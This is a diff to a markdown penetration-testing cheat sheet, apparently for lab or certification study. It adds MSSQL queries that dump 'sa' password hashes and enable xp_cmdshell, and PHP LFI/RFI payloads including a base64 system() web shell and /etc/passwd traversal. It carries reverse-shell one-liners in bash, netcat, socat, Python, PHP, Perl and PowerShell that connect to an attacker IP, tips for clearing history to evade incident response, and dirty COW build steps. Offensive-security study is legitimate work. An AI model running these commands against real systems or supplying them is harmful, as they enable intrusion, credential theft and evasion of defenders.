@@ -53,24 +53,26 @@ Other great cheetsheets:
     - [4.2.7. Zip File Password Cracking](#427-zip-file-password-cracking)
   - [4.3. Port Knocking](#43-port-knocking)
   - [4.4. Buffer Overflows](#44-buffer-overflows)
-  - [4.5. Reverse Shells](#45-reverse-shells)
-    - [4.5.1. Covering your tracks](#451-covering-your-tracks)
-    - [4.5.2. Running a detached/daeminized process on Linux](#452-running-a-detacheddaeminized-process-on-linux)
-    - [4.5.3. Netcat Listener](#453-netcat-listener)
-    - [4.5.4. Socat Listener](#454-socat-listener)
-    - [4.5.5. Bash Reverse Shell](#455-bash-reverse-shell)
-    - [4.5.6. Netcat Reverse Shell](#456-netcat-reverse-shell)
-    - [4.5.7. Socat Reverse Shell](#457-socat-reverse-shell)
-    - [4.5.8. Python Reverse Shell](#458-python-reverse-shell)
-    - [4.5.9. PHP Reverse Shell](#459-php-reverse-shell)
-    - [4.5.10. Perl Reverse Shell](#4510-perl-reverse-shell)
-    - [4.5.11. Powershell Reverse Shell](#4511-powershell-reverse-shell)
-    - [4.5.12. OpenSSL Encrypted Reverse Shell](#4512-openssl-encrypted-reverse-shell)
-  - [4.6. Encryption](#46-encryption)
-    - [4.6.1. Create self-signed SSL/TLS certificate](#461-create-self-signed-ssltls-certificate)
-    - [4.6.2. Decrypting files with GPG](#462-decrypting-files-with-gpg)
-  - [4.7. Post Exploit Frameworks](#47-post-exploit-frameworks)
-    - [4.7.1. Merlin Framework](#471-merlin-framework)
+  - [4.5. PHP Exploitation](#45-php-exploitation)
+    - [4.5.1. LFI/RFI](#451-lfirfi)
+  - [4.6. Reverse Shells](#46-reverse-shells)
+    - [4.6.1. Covering your tracks](#461-covering-your-tracks)
+    - [4.6.2. Running a detached/daeminized process on Linux](#462-running-a-detacheddaeminized-process-on-linux)
+    - [4.6.3. Netcat Listener](#463-netcat-listener)
+    - [4.6.4. Socat Listener](#464-socat-listener)
+    - [4.6.5. Bash Reverse Shell](#465-bash-reverse-shell)
+    - [4.6.6. Netcat Reverse Shell](#466-netcat-reverse-shell)
+    - [4.6.7. Socat Reverse Shell](#467-socat-reverse-shell)
+    - [4.6.8. Python Reverse Shell](#468-python-reverse-shell)
+    - [4.6.9. PHP Reverse Shell](#469-php-reverse-shell)
+    - [4.6.10. Perl Reverse Shell](#4610-perl-reverse-shell)
+    - [4.6.11. Powershell Reverse Shell](#4611-powershell-reverse-shell)
+    - [4.6.12. OpenSSL Encrypted Reverse Shell](#4612-openssl-encrypted-reverse-shell)
+  - [4.7. Encryption](#47-encryption)
+    - [4.7.1. Create self-signed SSL/TLS certificate](#471-create-self-signed-ssltls-certificate)
+    - [4.7.2. Decrypting files with GPG](#472-decrypting-files-with-gpg)
+  - [4.8. Post Exploit Frameworks](#48-post-exploit-frameworks)
+    - [4.8.1. Merlin Framework](#481-merlin-framework)
 - [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
   - [5.1. Basic Windows Post-Exploit Enumeration](#51-basic-windows-post-exploit-enumeration)
   - [5.2. Using Saved Windows Credentials](#52-using-saved-windows-credentials)
@@ -665,6 +667,34 @@ See [Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
 
 More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
 
+For basic information gathering when you are interacting on an MSSQL database:
+
+```sql
+-- show username
+select user_name();
+select current_user;  -- alternate way
+-- show server version
+select @@version;
+-- get server name
+select @@servername;
+-- show list of databases
+select name from master.sys.databases;
+exec sp_databases;  -- alternate way
+-- note: built-in databases are master, tempdb, model, and msdb
+-- you can exclude them to show only user-created databases like so:
+select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');
+-- getting table names from a specific database:
+select table_name from somedatabase.information_schema.tables;
+-- getting column names from a specific table:
+select column_name from somedatabase.information_schema.columns where table_name='sometable';
+-- get credentials for 'sa' login user:
+select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
+```
+
+References:
+- [PentestMonkey MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
+
 ### 3.14.1. MS SQL Server Command Execution
 
 ```sh
@@ -681,13 +711,18 @@ impacket-mssqlclient DOMAIN/USERNAME@$VICTIM_IP -windows-auth
 SELECT IS_SRVROLEMEMBER('sysadmin');
 go
 
+-- Check if already enabled
+-- check if xp_cmdshell is enabled
+SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS CMDSHELL_ENABLED FROM sys.configurations WHERE name = N'xp_cmdshell';
+go
+
 -- turn on advanced options; needed to configure xp_cmdshell
-sp_configure 'show advanced options', '1';
-RECONFIGURE;
+sp_configure 'show advanced options', '1';RECONFIGURE;
+go
 
 -- enable xp_cmdshell
-sp_configure 'xp_cmdshell', '1';
-RECONFIGURE;
+sp_configure 'xp_cmdshell', '1';RECONFIGURE;
+go
 
 -- Quickly check what the service account is via xp_cmdshell
 EXEC master..xp_cmdshell 'whoami';
@@ -1238,12 +1273,49 @@ Here are some useful commands:
 !mona jmp -r esp -cpb '\x00\x51'
 ```
 
-## 4.5. Reverse Shells
+## 4.5. PHP Exploitation
+
+### 4.5.1. LFI/RFI
+
+Some handy wrappers:
+[PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)
+
+```sh
+# base64 encode file before grabbing (helps grab php source or binary files)
+# available starting with PHP 5.0.0
+php://filter/convert.base64-encode/resource=/path/to/file
+# filter without base64-encode:
+php://filter/resource=
+# chaining multiple filters with "|":
+php://filter/convert.base64-encode|convert.base64-decode/resource=index.php
+
+# if enabled (not default), run commands:
+expect://whoami
+
+# Use this one as the query param's value to tell it to look at the POST
+# request body for the text to insert there. Useful for injecting complex
+# php payloads
+php://input
+# example POST body: <?php system('whoami'); ?>
+
+# use "data:" to inject executable php code directly into the URL
+data:text/plain,<?php phpinfo(); ?>
+data:,<?system($_GET['x']);?>&x=ls
+data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
+
+# sometimes you can trick PHP not to concatenate a .php file extension onto
+# a file path by injecting a NULL byte. E.g.:
+?page=../../../etc/passwd%00
+# you can take this technique further and URL-encode the entire php://filter
+# directive to hopefully bypass server-side filters on it. Or even double-encode
+```
+
+## 4.6. Reverse Shells
 
 - [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse Shell Generator](https://www.revshells.com/)
 
-### 4.5.1. Covering your tracks
+### 4.6.1. Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
 terminal history. To avoid logging this (to make incident response team's job
@@ -1261,7 +1333,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
 Remove-Module PSReadline
 ```
 
-### 4.5.2. Running a detached/daeminized process on Linux
+### 4.6.2. Running a detached/daeminized process on Linux
 
 When delivering a payload, sometimes it needs to run as a daemon so it doesn't
 die when the session/connection is closed. Normally you do this with `nohup`,
@@ -1272,14 +1344,14 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 ( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
 ```
 
-### 4.5.3. Netcat Listener
+### 4.6.3. Netcat Listener
 
 ```sh
 nc -vlnp LISTEN_PORT
 # on mac, exclude the "-p" flag
 ```
 
-### 4.5.4. Socat Listener
+### 4.6.4. Socat Listener
 
 ```sh
 # full tty over TCP
@@ -1295,14 +1367,14 @@ socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,ver
 
 Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)
 
-### 4.5.5. Bash Reverse Shell
+### 4.6.5. Bash Reverse Shell
 
 ```sh
 # only works on Linux
 bash -i >& /dev/tcp/LISTEN_IP/443 0>&1
 ```
 
-### 4.5.6. Netcat Reverse Shell
+### 4.6.6. Netcat Reverse Shell
 
 ```sh
 # if netcat has the -e flag:
@@ -1312,7 +1384,7 @@ nc -e /bin/sh 192.168.119.144 443
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
 ```
 
-### 4.5.7. Socat Reverse Shell
+### 4.6.7. Socat Reverse Shell
 
 ```sh
 # with full tty
@@ -1325,27 +1397,27 @@ socat EXEC:/bin/bash TCP:192.168.119.144:443
 socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
 ```
 
-### 4.5.8. Python Reverse Shell
+### 4.6.8. Python Reverse Shell
 
 ```sh
 python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
-### 4.5.9. PHP Reverse Shell
+### 4.6.9. PHP Reverse Shell
 
 ```sh
 # may have to try different socket numbers besides 3 (4,5,6...)
 php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### 4.5.10. Perl Reverse Shell
+### 4.6.10. Perl Reverse Shell
 
 ```sh
 perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-### 4.5.11. Powershell Reverse Shell
+### 4.6.11. Powershell Reverse Shell
 
 Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
 
@@ -1353,7 +1425,7 @@ Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ..
 $client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-### 4.5.12. OpenSSL Encrypted Reverse Shell
+### 4.6.12. OpenSSL Encrypted Reverse Shell
 
 ```sh
 # generate key on server
@@ -1365,9 +1437,9 @@ sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
 rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
-## 4.6. Encryption
+## 4.7. Encryption
 
-### 4.6.1. Create self-signed SSL/TLS certificate
+### 4.7.1. Create self-signed SSL/TLS certificate
 
 ```sh
 # generate separate .key and .crt files
@@ -1388,7 +1460,7 @@ openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
 openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
 ```
 
-### 4.6.2. Decrypting files with GPG
+### 4.7.2. Decrypting files with GPG
 
 ```sh
 # import public and private keys into gpg
@@ -1404,9 +1476,9 @@ gpg --list-secret-keys
 gpg -d -o secret.txt secret.txt.gpg
 ```
 
-## 4.7. Post Exploit Frameworks
+## 4.8. Post Exploit Frameworks
 
-### 4.7.1. Merlin Framework
+### 4.8.1. Merlin Framework
 
 ```sh
 # get server (password: merlin)
@@ -2498,9 +2570,13 @@ chmod +xs /tmp/nfs/shell.elf
 is effective against Linux kernels 2.x through 4.x before 4.8.3.
 
 ```sh
+# easiest if g++ avail
 searchsploit -m 40847
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ./dcow -s
+
+# Also good:
+searchsploit -m 40839
 ```
 
 # 7. Loot
